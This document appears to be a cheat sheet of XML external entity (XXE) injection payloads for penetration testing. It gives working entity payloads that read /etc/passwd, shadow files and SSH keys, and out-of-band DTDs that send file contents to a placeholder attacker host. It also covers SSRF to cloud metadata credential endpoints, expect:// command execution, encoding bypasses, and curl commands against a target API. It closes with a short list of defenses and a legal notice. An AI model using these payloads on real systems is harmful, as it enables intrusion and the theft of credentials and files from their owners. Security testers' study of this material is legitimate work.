# XXE Injection Cheat Sheet

Quick reference guide for XXE injection testing during authorized security assessments.

## 📋 Quick Reference

### Basic XXE Syntax

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Blind XXE (Out-of-Band)

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER.com/evil.dtd">%xxe;]>
<root>test</root>
```

### XInclude Attack

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## 🐧 Linux Target Files

### Critical System Files
```
/etc/passwd              # User accounts
/etc/shadow              # Password hashes (requires root)
/etc/hosts               # Host file
/etc/hostname            # System hostname
/etc/issue               # OS version
/etc/group               # User groups
/etc/resolv.conf         # DNS resolver
/etc/networks            # Network settings
/etc/fstab               # Filesystem mount points
/etc/crontab             # Cron jobs
```

### Process Information
```
/proc/self/environ       # Environment variables
/proc/self/cmdline       # Command line arguments
/proc/version            # Kernel version
/proc/cpuinfo            # CPU information
/proc/meminfo            # Memory information
```

### Web Server Files
```
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.htaccess
/var/www/html/wp-config.php
/usr/local/apache2/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/php.ini
/etc/php/7.4/apache2/php.ini
/etc/mysql/my.cnf
```

### Logs
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
```

### SSH Keys
```
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/home/user/.ssh/authorized_keys
/home/user/.bash_history
/root/.bash_history
```

---

## 🪟 Windows Target Files

### System Files
```
c:/windows/win.ini
c:/windows/system.ini
c:/boot.ini
c:/windows/system32/drivers/etc/hosts
c:/windows/system32/config/sam
c:/windows/system32/config/system
c:/windows/system32/config/security
c:/windows/repair/sam
c:/windows/repair/system
```

### Web Server
```
c:/inetpub/wwwroot/web.config
c:/inetpub/logs/LogFiles/
c:/Program Files/Apache Group/Apache2/conf/httpd.conf
c:/xampp/apache/conf/httpd.conf
c:/wamp/bin/apache/apache2.4.9/conf/httpd.conf
```

### Application Data
```
c:/Users/Administrator/Desktop/
c:/Users/Administrator/Documents/
c:/Users/[USERNAME]/AppData/Local/
c:/ProgramData/
```

---

## 🌐 Protocols

### File Protocol
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file://c:/windows/win.ini">
```

### HTTP/HTTPS Protocol
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:80">
<!ENTITY xxe SYSTEM "https://internal-api.local">
```

### PHP Wrappers
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
<!ENTITY xxe SYSTEM "php://input">
```

### Expect (Code Execution)
```xml
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://ls">
<!ENTITY xxe SYSTEM "expect://whoami">
```

### Data URI
```xml
<!ENTITY xxe SYSTEM "data:text/plain;base64,SGVsbG8gV29ybGQ=">
```

### Exotic Protocols
```xml
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO">
<!ENTITY xxe SYSTEM "dict://127.0.0.1:11211/stats">
<!ENTITY xxe SYSTEM "ftp://anonymous:anonymous@127.0.0.1:21">
<!ENTITY xxe SYSTEM "ldap://127.0.0.1:389">
<!ENTITY xxe SYSTEM "jar:file:///var/www/html/app.jar!/resource.txt">
```

---

## ☁️ Cloud Metadata Endpoints

### AWS EC2
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

### Alibaba Cloud
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Digital Ocean
```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
```

---

## 🔧 Advanced Techniques

### Blind XXE with External DTD

**Payload:**
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER.com/evil.dtd">%xxe;]>
```

**evil.dtd (on attacker server):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER.com/?data=%file;'>">
%eval;
%exfil;
```

### Error-Based XXE

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
```

### Local DTD Exploitation

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % expr 'aaa)>
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
<!ELEMENT aa (bb'>
%local_dtd;
]>
```

### CDATA Wrapper

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://ATTACKER.com/?data=%start;%file;%end;'>">
%all;
```

---

## 🎯 Testing Workflow

### 1. Detection
```xml
<!-- Test for XML parsing -->
<?xml version="1.0"?>
<root><test>value</test></root>

<!-- Test for external entity processing -->
<!DOCTYPE test [<!ENTITY xxe "TestValue">]>
<root>&xxe;</root>
```

### 2. File Disclosure
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### 3. SSRF
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]>
<root>&xxe;</root>
```

### 4. Blind XXE
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burpcollaborator.net">%xxe;]>
<root>test</root>
```

---

## 🚫 Bypass Techniques

### UTF-7 Encoding
```xml
<?xml version="1.0" encoding="UTF-7"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Character Encoding
```
UTF-16BE, UTF-16LE, UTF-32BE, UTF-32LE, ISO-8859-1
```

### Alternative Syntax
```xml
<!-- Without XML declaration -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Short syntax -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/etc/passwd">]>
<foo>&xxe;</foo>
```

### Nested Entities
```xml
<!DOCTYPE foo [
<!ENTITY % param1 "<!ENTITY &#x25; param2 'file:///etc/passwd'>">
%param1;
%param2;
]>
```

---

## 🛠️ Tools

### Validation
```bash
# Validate XML syntax
xmllint --noout file.xml

# Python validation
python3 -c "import xml.etree.ElementTree as ET; ET.parse('file.xml')"
```

### Testing
```bash
# Start HTTP server for callbacks
python3 -m http.server 80

# Monitor DNS
tcpdump -i any -n port 53

# Netcat listener
nc -lvnp 80
```

### Burp Suite
```
1. Proxy → Intercept request
2. Send to Intruder (Ctrl+I)
3. Load payloads from Intruder/*.txt
4. Start attack
5. Analyze responses
```

---

## 📊 Response Analysis

### Signs of Success

**File Disclosure:**
- Response contains `root:x:0:0:` (Linux)
- Response contains `[extensions]` (Windows)
- Base64 encoded content

**SSRF:**
- Different response times
- Different status codes
- Error messages with internal IPs

**Blind XXE:**
- DNS/HTTP callbacks to your server
- Server logs show incoming connections

---

## 🔒 Common Defenses

- Disabled external entities
- DTD processing disabled
- Input validation/sanitization
- XML parser security configurations
- WAF/IDS rules

---

## 💡 Pro Tips

1. **Always start simple** - Basic payloads first
2. **Use Burp Collaborator** - For blind XXE detection
3. **Check error messages** - They reveal parser information
4. **Try multiple encodings** - UTF-7, UTF-16, etc.
5. **Test all XML inputs** - APIs, file uploads, SOAP, etc.
6. **Monitor response times** - Indicates SSRF success
7. **Use PHP filters** - For reading PHP source code
8. **Try XInclude** - When DOCTYPE is blocked
9. **Local DTD files** - For error-based exploitation
10. **Document everything** - Keep detailed notes

---

## ⚠️ Legal Notice

**USE ONLY ON AUTHORIZED SYSTEMS**

- Obtain written permission before testing
- Follow responsible disclosure practices
- Comply with all applicable laws
- Respect scope limitations
- Don't access/exfiltrate sensitive data without authorization

---

## 📚 Quick Reference Commands

```bash
# Test XML parsing
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><root>test</root>' http://target.com/api

# Test XXE
curl -X POST -H "Content-Type: application/xml" -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' http://target.com/api

# Base64 decode response
echo "BASE64_STRING" | base64 -d

# Start simple HTTP server
python3 -m http.server 80

# Monitor HTTP traffic
sudo tcpdump -i any -s 0 -A 'tcp port 80'
```

---

**Remember:** This cheat sheet is for **authorized security testing only**. Always obtain proper permission before testing any system.

**Stay ethical. Stay legal. Stay curious.** 🔐